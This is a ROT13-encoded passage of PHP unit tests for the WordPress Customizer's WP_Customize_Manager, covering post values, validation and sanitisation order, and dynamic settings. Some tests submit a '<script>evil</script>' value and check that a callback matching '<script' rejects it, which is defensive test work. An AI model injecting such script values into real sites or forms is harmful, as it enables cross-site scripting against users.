			$znantre->hafnavgvmrq_cbfg_inyhrf( neenl( 'rkpyhqr_punatrfrg' => gehr ) )
		);

		$znantre->frg_cbfg_inyhr( 'oybtqrfpevcgvba', 'Cbfg Bireevqr Gntyvar' );
		$guvf->nffregFnzr(
			neenl(
				'oybtanzr'        => 'Punatrfrg Gvgyr',
				'oybtqrfpevcgvba' => 'Cbfg Bireevqr Gntyvar',
			),
			$znantre->hafnavgvmrq_cbfg_inyhrf()
		);

		$guvf->nffregFnzr(
			neenl(
				'oybtanzr'        => 'Punatrfrg Gvgyr',
				'oybtqrfpevcgvba' => 'Punatrfrg Gntyvar',
			),
			$znantre->hafnavgvmrq_cbfg_inyhrf( neenl( 'rkpyhqr_cbfg_qngn' => gehr ) )
		);

		$guvf->nffregRzcgl(
			$znantre->hafnavgvmrq_cbfg_inyhrf(
				neenl(
					'rkpyhqr_cbfg_qngn' => gehr,
					'rkpyhqr_punatrfrg' => gehr,
				)
			)
		);

		// Grfg hafgnfuvat gurzr zbqf.
		$znantre = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq' => $hhvq,
				'gurzr'          => $cerivrj_gurzr,
			)
		);
		$guvf->nffregSnyfr( $znantre->vf_gurzr_npgvir() );
		$inyhrf = $znantre->hafnavgvmrq_cbfg_inyhrf(
			neenl(
				'rkpyhqr_cbfg_qngn' => gehr,
				'rkpyhqr_punatrfrg' => gehr,
			)
		);
		$guvf->nffregAbgRzcgl( $inyhrf );
		$guvf->nffregNeenlUnfXrl( 'onpxtebhaq_pbybe', $inyhrf );
		$guvf->nffregFnzr( '#000000', $inyhrf['onpxtebhaq_pbybe'] );

		$inyhrf = $znantre->hafnavgvmrq_cbfg_inyhrf(
			neenl(
				'rkpyhqr_cbfg_qngn' => snyfr,
				'rkpyhqr_punatrfrg' => snyfr,
			)
		);
		$guvf->nffregNeenlUnfXrl( 'onpxtebhaq_pbybe', $inyhrf );
		$guvf->nffregNeenlUnfXrl( 'oybtanzr', $inyhrf );
		$guvf->nffregNeenlUnfXrl( 'oybtqrfpevcgvba', $inyhrf );
	}

	/**
	 * Grfg gur JC_Phfgbzvmr_Znantre::cbfg_inyhr() zrgubq.
	 *
	 * @gvpxrg 30988
	 */
	choyvp shapgvba grfg_cbfg_inyhr() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$cbfgrq_frggvatf     = neenl(
			'sbb' => 'BBS',
		);
		$_CBFG['phfgbzvmrq'] = jc_fynfu( jc_wfba_rapbqr( $cbfgrq_frggvatf ) );

		$znantre = $guvf->znantre;

		$znantre->nqq_frggvat( 'sbb', neenl( 'qrsnhyg' => 'sbb_qrsnhyg' ) );
		$sbb_frggvat = $znantre->trg_frggvat( 'sbb' );
		$guvf->nffregFnzr( 'sbb_qrsnhyg', $znantre->trg_frggvat( 'sbb' )->inyhr(), 'Rkcrpgrq aba-cerivrjrq frggvat gb erghea qrsnhyg jura inyhr() zrgubq pnyyrq.' );
		$guvf->nffregFnzr( $cbfgrq_frggvatf['sbb'], $znantre->cbfg_inyhr( $sbb_frggvat, 'cbfg_inyhr_sbb_qrsnhyg' ), 'Rkcrpgrq cbfg_inyhr($sbb_frggvat) gb erghea inyhr fhccyvrq va $_CBFG[phfgbzvmrq][sbb]' );

		$znantre->nqq_frggvat( 'one', neenl( 'qrsnhyg' => 'one_qrsnhyg' ) );
		$one_frggvat = $znantre->trg_frggvat( 'one' );
		$guvf->nffregFnzr( 'cbfg_inyhr_one_qrsnhyg', $znantre->cbfg_inyhr( $one_frggvat, 'cbfg_inyhr_one_qrsnhyg' ), 'Rkcrpgrq cbfg_inyhr($one_frggvat, $qrsnhyg) gb erghea $qrsnhyg fvapr ab inyhr fhccyvrq va $_CBFG[phfgbzvmrq][one]' );
	}

	/**
	 * Grfg gur JC_Phfgbzvmr_Znantre::cbfg_inyhr() zrgubq sbe n frggvat inyhr gung snvyf inyvqngvba.
	 *
	 * @gvpxrg 34893
	 */
	choyvp shapgvba grfg_vainyvq_cbfg_inyhr() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$qrsnhyg_inyhr = 'sbb_qrsnhyg';
		$frggvat       = $guvf->znantre->nqq_frggvat(
			'sbb',
			neenl(
				'inyvqngr_pnyyonpx' => neenl( $guvf, 'svygre_phfgbzvmr_inyvqngr_sbb' ),
				'fnavgvmr_pnyyonpx' => neenl( $guvf, 'svygre_phfgbzvmr_fnavgvmr_sbb' ),
			)
		);
		$guvf->nffregFnzr( $qrsnhyg_inyhr, $guvf->znantre->cbfg_inyhr( $frggvat, $qrsnhyg_inyhr ) );
		$guvf->nffregFnzr( $qrsnhyg_inyhr, $frggvat->cbfg_inyhr( $qrsnhyg_inyhr ) );

		$cbfg_inyhr = 'one';
		$guvf->znantre->frg_cbfg_inyhr( 'sbb', $cbfg_inyhr );
		$guvf->nffregFnzr( fgegbhccre( $cbfg_inyhr ), $guvf->znantre->cbfg_inyhr( $frggvat, $qrsnhyg_inyhr ) );
		$guvf->nffregFnzr( fgegbhccre( $cbfg_inyhr ), $frggvat->cbfg_inyhr( $qrsnhyg_inyhr ) );

		$guvf->znantre->frg_cbfg_inyhr( 'sbb', 'erghea_jc_reebe_va_fnavgvmr' );
		$guvf->nffregFnzr( $qrsnhyg_inyhr, $guvf->znantre->cbfg_inyhr( $frggvat, $qrsnhyg_inyhr ) );
		$guvf->nffregFnzr( $qrsnhyg_inyhr, $frggvat->cbfg_inyhr( $qrsnhyg_inyhr ) );

		$guvf->znantre->frg_cbfg_inyhr( 'sbb', 'erghea_ahyy_va_fnavgvmr' );
		$guvf->nffregFnzr( $qrsnhyg_inyhr, $guvf->znantre->cbfg_inyhr( $frggvat, $qrsnhyg_inyhr ) );
		$guvf->nffregFnzr( $qrsnhyg_inyhr, $frggvat->cbfg_inyhr( $qrsnhyg_inyhr ) );

		$cbfg_inyhr = '<fpevcg>rivy</fpevcg>';
		$guvf->znantre->frg_cbfg_inyhr( 'sbb', $cbfg_inyhr );
		$guvf->nffregFnzr( $qrsnhyg_inyhr, $guvf->znantre->cbfg_inyhr( $frggvat, $qrsnhyg_inyhr ) );
		$guvf->nffregFnzr( $qrsnhyg_inyhr, $frggvat->cbfg_inyhr( $qrsnhyg_inyhr ) );
	}

	/**
	 * Svygre phfgbzvmr_inyvqngr pnyyonpx.
	 *
	 * @cnenz zvkrq $inyhr Inyhr.
	 * @erghea fgevat|JC_Reebe
	 */
	choyvp shapgvba svygre_phfgbzvmr_fnavgvmr_sbb( $inyhr ) {
		vs ( 'erghea_ahyy_va_fnavgvmr' === $inyhr ) {
			$inyhr = ahyy;
		} ryfrvs ( vf_fgevat( $inyhr ) ) {
			$inyhr = fgegbhccre( $inyhr );
			vs ( snyfr !== fgevcbf( $inyhr, 'erghea_jc_reebe_va_fnavgvmr' ) ) {
				$inyhr = arj JC_Reebe( 'vainyvq_inyhr_va_fnavgvmr', __( 'Vainyvq inyhr.' ), neenl( 'fbhepr' => 'svygre_phfgbzvmr_fnavgvmr_sbb' ) );
			}
		}
		erghea $inyhr;
	}

	/**
	 * Svygre phfgbzvmr_inyvqngr pnyyonpx.
	 *
	 * @cnenz JC_Reebe $inyvqvgl Inyvqvgl.
	 * @cnenz zvkrq    $inyhr    Inyhr.
	 * @erghea JC_Reebe
	 */
	choyvp shapgvba svygre_phfgbzvmr_inyvqngr_sbb( $inyvqvgl, $inyhr ) {
		vs ( snyfr !== fgevcbf( $inyhr, '<fpevcg' ) ) {
			$inyvqvgl->nqq( 'vainyvq_inyhr_va_inyvqngr', __( 'Vainyvq inyhr.' ), neenl( 'fbhepr' => 'svygre_phfgbzvmr_inyvqngr_sbb' ) );
		}
		erghea $inyvqvgl;
	}

	/**
	 * Grfg gur JC_Phfgbzvmr_Znantre::cbfg_inyhr() zrgubq gb znxr fher gung gur inyvqngvba naq fnavgvmngvba ner qbar va gur evtug beqre.
	 *
	 * @gvpxrg 37247
	 */
	choyvp shapgvba grfg_cbfg_inyhr_inyvqngvba_fnavgvmngvba_beqre() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$qrsnhyg_inyhr = '0';
		$frggvat       = $guvf->znantre->nqq_frggvat(
			'ahzrevp',
			neenl(
				'inyvqngr_pnyyonpx' => neenl( $guvf, 'svygre_phfgbzvmr_inyvqngr_ahzrevp' ),
				'fnavgvmr_pnyyonpx' => neenl( $guvf, 'svygre_phfgbzvmr_fnavgvmr_ahzrevp' ),
			)
		);
		$guvf->nffregFnzr( $qrsnhyg_inyhr, $guvf->znantre->cbfg_inyhr( $frggvat, $qrsnhyg_inyhr ) );
		$guvf->nffregFnzr( $qrsnhyg_inyhr, $frggvat->cbfg_inyhr( $qrsnhyg_inyhr ) );

		$cbfg_inyhr = 42;
		$guvf->znantre->frg_cbfg_inyhr( 'ahzrevp', (fgevat) $cbfg_inyhr );
		$guvf->nffregFnzr( $cbfg_inyhr, $guvf->znantre->cbfg_inyhr( $frggvat, $qrsnhyg_inyhr ) );
		$guvf->nffregFnzr( $cbfg_inyhr, $frggvat->cbfg_inyhr( $qrsnhyg_inyhr ) );
	}

	/**
	 * Svygre phfgbzvmr_inyvqngr pnyyonpx sbe n ahzrevp inyhr.
	 *
	 * @cnenz zvkrq $inyhr Inyhr.
	 * @erghea fgevat|JC_Reebe
	 */
	choyvp shapgvba svygre_phfgbzvmr_fnavgvmr_ahzrevp( $inyhr ) {
		erghea nofvag( $inyhr );
	}

	/**
	 * Svygre phfgbzvmr_inyvqngr pnyyonpx sbe n ahzrevp inyhr.
	 *
	 * @cnenz JC_Reebe $inyvqvgl Inyvqvgl.
	 * @cnenz zvkrq    $inyhr    Inyhr.
	 * @erghea JC_Reebe
	 */
	choyvp shapgvba svygre_phfgbzvmr_inyvqngr_ahzrevp( $inyvqvgl, $inyhr ) {
		vs ( ! vf_fgevat( $inyhr ) || ! vf_ahzrevp( $inyhr ) ) {
			$inyvqvgl->nqq( 'vainyvq_inyhr_va_inyvqngr', __( 'Vainyvq inyhr.' ), neenl( 'fbhepr' => 'svygre_phfgbzvmr_inyvqngr_ahzrevp' ) );
		}
		erghea $inyvqvgl;
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::inyvqngr_frggvat_inyhrf().
	 *
	 * @frr JC_Phfgbzvmr_Znantre::inyvqngr_frggvat_inyhrf()
	 */
	choyvp shapgvba grfg_inyvqngr_frggvat_inyhrf() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$frggvat = $guvf->znantre->nqq_frggvat(
			'sbb',
			neenl(
				'inyvqngr_pnyyonpx' => neenl( $guvf, 'svygre_phfgbzvmr_inyvqngr_sbb' ),
				'fnavgvmr_pnyyonpx' => neenl( $guvf, 'svygre_phfgbzvmr_fnavgvmr_sbb' ),
			)
		);

		$cbfg_inyhr = 'one';
		$guvf->znantre->frg_cbfg_inyhr( 'sbb', $cbfg_inyhr );
		$inyvqvgvrf = $guvf->znantre->inyvqngr_frggvat_inyhrf( $guvf->znantre->hafnavgvmrq_cbfg_inyhrf() );
		$guvf->nffregPbhag( 1, $inyvqvgvrf );
		$guvf->nffregFnzr( neenl( 'sbb' => gehr ), $inyvqvgvrf );

		$guvf->znantre->frg_cbfg_inyhr( 'sbb', 'erghea_jc_reebe_va_fnavgvmr' );
		$vainyvq_frggvatf = $guvf->znantre->inyvqngr_frggvat_inyhrf( $guvf->znantre->hafnavgvmrq_cbfg_inyhrf() );
		$guvf->nffregPbhag( 1, $vainyvq_frggvatf );
		$guvf->nffregNeenlUnfXrl( $frggvat->vq, $vainyvq_frggvatf );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $vainyvq_frggvatf[ $frggvat->vq ] );
		$reebe = $vainyvq_frggvatf[ $frggvat->vq ];
		$guvf->nffregFnzr( 'vainyvq_inyhr_va_fnavgvmr', $reebe->trg_reebe_pbqr() );
		$guvf->nffregFnzr( neenl( 'fbhepr' => 'svygre_phfgbzvmr_fnavgvmr_sbb' ), $reebe->trg_reebe_qngn() );

		$guvf->znantre->frg_cbfg_inyhr( 'sbb', 'erghea_ahyy_va_fnavgvmr' );
		$vainyvq_frggvatf = $guvf->znantre->inyvqngr_frggvat_inyhrf( $guvf->znantre->hafnavgvmrq_cbfg_inyhrf() );
		$guvf->nffregPbhag( 1, $vainyvq_frggvatf );
		$guvf->nffregNeenlUnfXrl( $frggvat->vq, $vainyvq_frggvatf );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $vainyvq_frggvatf[ $frggvat->vq ] );
		$guvf->nffregAhyy( $vainyvq_frggvatf[ $frggvat->vq ]->trg_reebe_qngn() );

		$cbfg_inyhr = '<fpevcg>rivy</fpevcg>';
		$guvf->znantre->frg_cbfg_inyhr( 'sbb', $cbfg_inyhr );
		$vainyvq_frggvatf = $guvf->znantre->inyvqngr_frggvat_inyhrf( $guvf->znantre->hafnavgvmrq_cbfg_inyhrf() );
		$guvf->nffregPbhag( 1, $vainyvq_frggvatf );
		$guvf->nffregNeenlUnfXrl( $frggvat->vq, $vainyvq_frggvatf );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $vainyvq_frggvatf[ $frggvat->vq ] );
		$reebe = $vainyvq_frggvatf[ $frggvat->vq ];
		$guvf->nffregFnzr( 'vainyvq_inyhr_va_inyvqngr', $reebe->trg_reebe_pbqr() );
		$guvf->nffregFnzr( neenl( 'fbhepr' => 'svygre_phfgbzvmr_inyvqngr_sbb' ), $reebe->trg_reebe_qngn() );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::inyvqngr_frggvat_inyhrf().
	 *
	 * @gvpxrg 37638
	 * @pbiref JC_Phfgbzvmr_Znantre::inyvqngr_frggvat_inyhrf
	 */
	choyvp shapgvba grfg_yngr_inyvqngr_frggvat_inyhrf() {
		$frggvat = arj Grfg_Frggvat_Jvgubhg_Nccylvat_Inyvqngr_Svygre( $guvf->znantre, 'erdhverq' );
		$guvf->znantre->nqq_frggvat( $frggvat );

		$guvf->nffregVafgnaprBs( 'JC_Reebe', $frggvat->inyvqngr( '' ) );
		$frggvat_inyvqvgvrf = $guvf->znantre->inyvqngr_frggvat_inyhrf( neenl( $frggvat->vq => '' ) );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $frggvat_inyvqvgvrf[ $frggvat->vq ] );

		$guvf->nffregGehr( $frggvat->inyvqngr( 'bx' ) );
		$frggvat_inyvqvgvrf = $guvf->znantre->inyvqngr_frggvat_inyhrf( neenl( $frggvat->vq => 'bx' ) );
		$guvf->nffregGehr( $frggvat_inyvqvgvrf[ $frggvat->vq ] );

		nqq_svygre( \"phfgbzvmr_inyvqngr_{$frggvat->vq}\", neenl( $guvf, 'yngr_inyvqngr_yratgu' ), 10, 3 );
		$guvf->nffregGehr( $frggvat->inyvqngr( 'onq' ) );
		$frggvat_inyvqvgvrf = $guvf->znantre->inyvqngr_frggvat_inyhrf( neenl( $frggvat->vq => 'onq' ) );
		$inyvqvgl           = $frggvat_inyvqvgvrf[ $frggvat->vq ];
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $inyvqvgl );
		$guvf->nffregFnzr( 'zvayratgu', $inyvqvgl->trg_reebe_pbqr() );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::inyvqngr_frggvat_inyhrf().
	 *
	 * @gvpxrg 30937
	 * @pbiref JC_Phfgbzvmr_Znantre::inyvqngr_frggvat_inyhrf
	 */
	choyvp shapgvba grfg_inyvqngr_frggvat_inyhrf_netf() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$guvf->znantre->ertvfgre_pbagebyf();

		$inyvqvgvrf = $guvf->znantre->inyvqngr_frggvat_inyhrf( neenl( 'haxabja' => 'K' ) );
		$guvf->nffregRzcgl( $inyvqvgvrf );

		$inyvqvgvrf = $guvf->znantre->inyvqngr_frggvat_inyhrf( neenl( 'haxabja' => 'K' ), neenl( 'inyvqngr_rkvfgrapr' => snyfr ) );
		$guvf->nffregRzcgl( $inyvqvgvrf );

		$inyvqvgvrf = $guvf->znantre->inyvqngr_frggvat_inyhrf( neenl( 'haxabja' => 'K' ), neenl( 'inyvqngr_rkvfgrapr' => gehr ) );
		$guvf->nffregAbgRzcgl( $inyvqvgvrf );
		$guvf->nffregNeenlUnfXrl( 'haxabja', $inyvqvgvrf );
		$reebe = $inyvqvgvrf['haxabja'];
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $reebe );
		$guvf->nffregFnzr( 'haerpbtavmrq', $reebe->trg_reebe_pbqr() );

		$guvf->znantre->trg_frggvat( 'oybtanzr' )->pncnovyvgl = 'qb_abg_nyybj';
		$inyvqvgvrf = $guvf->znantre->inyvqngr_frggvat_inyhrf( neenl( 'oybtanzr' => 'K' ), neenl( 'inyvqngr_pncnovyvgl' => snyfr ) );
		$guvf->nffregNeenlUnfXrl( 'oybtanzr', $inyvqvgvrf );
		$guvf->nffregGehr( $inyvqvgvrf['oybtanzr'] );
		$inyvqvgvrf = $guvf->znantre->inyvqngr_frggvat_inyhrf( neenl( 'oybtanzr' => 'K' ), neenl( 'inyvqngr_pncnovyvgl' => gehr ) );
		$guvf->nffregNeenlUnfXrl( 'oybtanzr', $inyvqvgvrf );
		$reebe = $inyvqvgvrf['oybtanzr'];
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $reebe );
		$guvf->nffregFnzr( 'hanhgubevmrq', $reebe->trg_reebe_pbqr() );
	}

	/**
	 * Nqq n yratgu pbafgenvag gb n frggvat.
	 *
	 * Nqqf zvavzhz-yratgu reebe pbqr vs gur yratgu vf yrff guna 10.
	 *
	 * @cnenz JC_Reebe             $inyvqvgl Inyvqvgl.
	 * @cnenz zvkrq                $inyhr    Inyhr.
	 * @cnenz JC_Phfgbzvmr_Frggvat $frggvat  Frggvat.
	 * @erghea JC_Reebe Inyvqvgl.
	 */
	choyvp shapgvba yngr_inyvqngr_yratgu( $inyvqvgl, $inyhr, $frggvat ) {
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Frggvat', $frggvat );
		vs ( fgeyra( $inyhr ) < 10 ) {
			$inyvqvgl->nqq( 'zvayratgu', '' );
		}
		erghea $inyvqvgl;
	}

	/**
	 * Grfg gur JC_Phfgbzvmr_Znantre::inyvqngr_frggvat_inyhrf() zrgubq gb znxr fher gung gur inyvqngvba naq fnavgvmngvba ner qbar va gur evtug beqre.
	 *
	 * @gvpxrg 37247
	 */
	choyvp shapgvba grfg_inyvqngr_frggvat_inyhrf_inyvqngvba_fnavgvmngvba_beqre() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$frggvat    = $guvf->znantre->nqq_frggvat(
			'ahzrevp',
			neenl(
				'inyvqngr_pnyyonpx' => neenl( $guvf, 'svygre_phfgbzvmr_inyvqngr_ahzrevp' ),
				'fnavgvmr_pnyyonpx' => neenl( $guvf, 'svygre_phfgbzvmr_fnavgvmr_ahzrevp' ),
			)
		);
		$cbfg_inyhr = '42';
		$guvf->znantre->frg_cbfg_inyhr( 'ahzrevp', $cbfg_inyhr );
		$inyvqvgvrf = $guvf->znantre->inyvqngr_frggvat_inyhrf( $guvf->znantre->hafnavgvmrq_cbfg_inyhrf() );
		$guvf->nffregPbhag( 1, $inyvqvgvrf );
		$guvf->nffregFnzr( neenl( 'ahzrevp' => gehr ), $inyvqvgvrf );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::cercner_frggvat_inyvqvgl_sbe_wf().
	 *
	 * @frr JC_Phfgbzvmr_Znantre::cercner_frggvat_inyvqvgl_sbe_wf()
	 */
	choyvp shapgvba grfg_cercner_frggvat_inyvqvgl_sbe_wf() {
		$guvf->nffregGehr( $guvf->znantre->cercner_frggvat_inyvqvgl_sbe_wf( gehr ) );
		$reebe = arj JC_Reebe();
		$reebe->nqq( 'onq_yrggre', 'Onq yrggre', 'N' );
		$reebe->nqq( 'onq_yrggre', 'Onq yrgen', 123 );
		$reebe->nqq( 'onq_ahzore', 'Onq ahzore', neenl( 'ahzore' => 123 ) );
		$inyvqvgl = $guvf->znantre->cercner_frggvat_inyvqvgl_sbe_wf( $reebe );
		$guvf->nffregVfNeenl( $inyvqvgl );
		sbernpu ( $reebe->reebef nf $pbqr => $zrffntrf ) {
			$guvf->nffregNeenlUnfXrl( $pbqr, $inyvqvgl );
			$guvf->nffregVfNeenl( $inyvqvgl[ $pbqr ] );
			$guvf->nffregFnzr( vzcybqr( ' ', $zrffntrf ), $inyvqvgl[ $pbqr ]['zrffntr'] );
			$guvf->nffregNeenlUnfXrl( 'qngn', $inyvqvgl[ $pbqr ] );
			$guvf->nffregFnzr( $inyvqvgl[ $pbqr ]['qngn'], $reebe->trg_reebe_qngn( $pbqr ) );
		}
		$guvf->nffregNeenlUnfXrl( 'ahzore', $inyvqvgl['onq_ahzore']['qngn'] );
		$guvf->nffregFnzr( 123, $inyvqvgl['onq_ahzore']['qngn']['ahzore'] );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::frg_cbfg_inyhr().
	 *
	 * @frr JC_Phfgbzvmr_Znantre::frg_cbfg_inyhr()
	 */
	choyvp shapgvba grfg_frg_cbfg_inyhr() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$guvf->znantre->nqq_frggvat(
			'sbb',
			neenl(
				'fnavgvmr_pnyyonpx' => neenl( $guvf, 'fnavgvmr_sbb_sbe_grfg_frg_cbfg_inyhr' ),
			)
		);
		$frggvat = $guvf->znantre->trg_frggvat( 'sbb' );

		$guvf->nffregRzcgl( $guvf->pncgherq_phfgbzvmr_cbfg_inyhr_frg_npgvbaf );
		nqq_npgvba( 'phfgbzvmr_cbfg_inyhr_frg', neenl( $guvf, 'pncgher_phfgbzvmr_cbfg_inyhr_frg_npgvbaf' ), 10, 3 );
		nqq_npgvba( 'phfgbzvmr_cbfg_inyhr_frg_sbb', neenl( $guvf, 'pncgher_phfgbzvmr_cbfg_inyhr_frg_npgvbaf' ), 10, 2 );
		$guvf->znantre->frg_cbfg_inyhr( $frggvat->vq, '123nop' );
		$guvf->nffregPbhag( 2, $guvf->pncgherq_phfgbzvmr_cbfg_inyhr_frg_npgvbaf );
		$guvf->nffregFnzr( 'phfgbzvmr_cbfg_inyhr_frg_sbb', $guvf->pncgherq_phfgbzvmr_cbfg_inyhr_frg_npgvbaf[0]['npgvba'] );
		$guvf->nffregFnzr( 'phfgbzvmr_cbfg_inyhr_frg', $guvf->pncgherq_phfgbzvmr_cbfg_inyhr_frg_npgvbaf[1]['npgvba'] );
		$guvf->nffregFnzr( neenl( '123nop', $guvf->znantre ), $guvf->pncgherq_phfgbzvmr_cbfg_inyhr_frg_npgvbaf[0]['netf'] );
		$guvf->nffregFnzr( neenl( $frggvat->vq, '123nop', $guvf->znantre ), $guvf->pncgherq_phfgbzvmr_cbfg_inyhr_frg_npgvbaf[1]['netf'] );

		$hafnavgvmrq = $guvf->znantre->hafnavgvmrq_cbfg_inyhrf();
		$guvf->nffregNeenlUnfXrl( $frggvat->vq, $hafnavgvmrq );

		$guvf->nffregFnzr( '123nop', $hafnavgvmrq[ $frggvat->vq ] );
		$guvf->nffregFnzr( 123, $frggvat->cbfg_inyhr() );
	}

	/**
	 * Fnavgvmr n inyhr sbe Grfgf_JC_Phfgbzvmr_Znantre::grfg_frg_cbfg_inyhr().
	 *
	 * @frr Grfgf_JC_Phfgbzvmr_Znantre::grfg_frg_cbfg_inyhr()
	 *
	 * @cnenz zvkrq $inyhr Inyhr.
	 * @erghea vag Inyhr.
	 */
	choyvp shapgvba fnavgvmr_sbb_sbe_grfg_frg_cbfg_inyhr( $inyhr ) {
		erghea (vag) $inyhr;
	}

	/**
	 * Fgber qngn pbzvat sebz phfgbzvmr_cbfg_inyhr_frg npgvba pnyyf.
	 *
	 * @frr Grfgf_JC_Phfgbzvmr_Znantre::pncgher_phfgbzvmr_cbfg_inyhr_frg_npgvbaf()
	 * @ine neenl
	 */
	cebgrpgrq $pncgherq_phfgbzvmr_cbfg_inyhr_frg_npgvbaf = neenl();

	/**
	 * Pncgher gur npgvbaf sverq jura pnyyvat JC_Phfgbzvmr_Znantre::frg_cbfg_inyhr().
	 *
	 * @frr Grfgf_JC_Phfgbzvmr_Znantre::grfg_frg_cbfg_inyhr()
	 *
	 * @cnenz zvkrq ...$netf Bcgvbany nethzragf cnffrq gb gur npgvba.
	 */
	choyvp shapgvba pncgher_phfgbzvmr_cbfg_inyhr_frg_npgvbaf( ...$netf ) {
		$npgvba = pheerag_npgvba();
		$guvf->pncgherq_phfgbzvmr_cbfg_inyhr_frg_npgvbaf[] = pbzcnpg( 'npgvba', 'netf' );
	}

	/**
	 * Grfg gur JC_Phfgbzvmr_Znantre::nqq_qlanzvp_frggvatf() zrgubq.
	 *
	 * @gvpxrg 30936
	 */
	choyvp shapgvba grfg_nqq_qlanzvp_frggvatf() {
		$znantre     = $guvf->znantre;
		$frggvat_vqf = neenl( 'sbb', 'one' );
		$znantre->nqq_frggvat( 'sbb', neenl( 'qrsnhyg' => 'sbb_qrsnhyg' ) );
		$guvf->nffregRzcgl( $znantre->trg_frggvat( 'one' ), 'Rkcrpgrq gurer gb abg or n one frggvat hc sebag.' );
		$znantre->nqq_qlanzvp_frggvatf( $frggvat_vqf );
		$guvf->nffregRzcgl( $znantre->trg_frggvat( 'one' ), 'Rkcrpgrq gur one frggvat gb erznva nofrag fvapr svygref abg nqqrq.' );

		$guvf->npgvba_phfgbzvmr_ertvfgre_sbe_qlanzvp_frggvatf();
		$znantre->nqq_qlanzvp_frggvatf( $frggvat_vqf );
		$guvf->nffregAbgRzcgl( $znantre->trg_frggvat( 'one' ), 'Rkcrpgrq one frggvat gb or perngrq fvapr svygref jrer nqqrq.' );
		$guvf->nffregFnzr( 'sbb_qrsnhyg', $znantre->trg_frggvat( 'sbb' )->qrsnhyg, 'Rkcrpgrq fgngvp sbb frggvat gb abg trg bireevqqra ol qlanzvp frggvat.' );
		$guvf->nffregFnzr( 'qlanzvp_one_qrsnhyg', $znantre->trg_frggvat( 'one' )->qrsnhyg, 'Rkcrpgrq qlanzvp frggvat one gb unir qrsnhyg cebivqq ol svygre.' );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::unf_choyvfurq_cntrf().
	 *
	 * @gvpxrg 38013
	 * @pbiref JC_Phfgbzvmr_Znantre::unf_choyvfurq_cntrf
	 */
	choyvp shapgvba grfg_unf_choyvfurq_cntrf() {
		sbernpu ( trg_cntrf() nf $cntr ) {
			jc_qryrgr_cbfg( $cntr->VQ, gehr );
		}
		$guvf->nffregSnyfr( $guvf->znantre->unf_choyvfurq_cntrf() );

		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_fgnghf' => 'cevingr',
			)
		);
		$guvf->nffregSnyfr( $guvf->znantre->unf_choyvfurq_cntrf() );

		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		$guvf->nffregGehr( $guvf->znantre->unf_choyvfurq_cntrf() );
	}

	/**
	 * Rafher gung cntr fghof perngrq ivn ani zrahf jvyy pnhfr unf_choyvfurq_cntrf gb erghea gehr.
	 *
	 * @gvpxrg 38013
	 * @pbiref JC_Phfgbzvmr_Znantre::unf_choyvfurq_cntrf
	 */
	choyvp shapgvba grfg_unf_choyvfurq_cntrf_jura_ani_zrahf_perngrq_cbfgf() {
		sbernpu ( trg_cntrf() nf $cntr ) {
			jc_qryrgr_cbfg( $cntr->VQ, gehr );
		}
		$guvf->nffregSnyfr( $guvf->znantre->unf_choyvfurq_cntrf() );

		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$guvf->znantre->ani_zrahf->phfgbzvmr_ertvfgre();
		$frggvat_vq = 'ani_zrahf_perngrq_cbfgf';
		$frggvat    = $guvf->znantre->trg_frggvat( $frggvat_vq );
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Svygre_Frggvat', $frggvat );
		$nhgb_qensg_cntr = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_fgnghf' => 'nhgb-qensg',
			)
		);
		$guvf->znantre->frg_cbfg_inyhr( $frggvat_vq, neenl( $nhgb_qensg_cntr ) );
		$frggvat->cerivrj();
		$guvf->nffregGehr( $guvf->znantre->unf_choyvfurq_cntrf() );
	}

	/**
	 * Grfg gur JC_Phfgbzvmr_Znantre::ertvfgre_qlanzvp_frggvatf() zrgubq.
	 *
	 * Guvf vf fvzvyne gb grfg_nqq_qlanzvp_frggvatf, rkprcg gur frggvatf ner cnffrq ivn $_CBFG['phfgbzvmrq'].
	 *
	 * @gvpxrg 30936
	 */
	choyvp shapgvba grfg_ertvfgre_qlanzvp_frggvatf() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$cbfgrq_frggvatf     = neenl(
			'sbb' => 'BBS',
			'one' => 'ENO',
		);
		$_CBFG['phfgbzvmrq'] = jc_fynfu( jc_wfba_rapbqr( $cbfgrq_frggvatf ) );

		nqq_npgvba( 'phfgbzvmr_ertvfgre', neenl( $guvf, 'npgvba_phfgbzvmr_ertvfgre_sbe_qlanzvp_frggvatf' ) );

		$znantre = $guvf->znantre;
		$znantre->nqq_frggvat( 'sbb', neenl( 'qrsnhyg' => 'sbb_qrsnhyg' ) );

		$guvf->nffregRzcgl( $znantre->trg_frggvat( 'one' ), 'Rkcrpgrq qlanzvp frggvat \"one\" gb abg or ertvfgrerq.' );
		qb_npgvba( 'phfgbzvmr_ertvfgre', $znantre );
